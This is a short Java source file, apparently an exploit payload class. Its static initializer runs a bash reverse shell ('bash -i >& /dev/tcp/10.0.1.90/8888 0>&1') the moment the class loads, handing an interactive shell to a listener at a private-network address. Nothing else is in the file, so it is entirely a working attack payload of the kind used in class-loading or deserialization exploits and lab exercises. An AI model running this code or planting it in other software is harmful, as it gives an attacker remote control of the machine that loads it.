public class RunCommand {
    static {
        try {
		String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/10.0.1.90/8888 0>&1"};
            Runtime.getRuntime().exec(commands).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
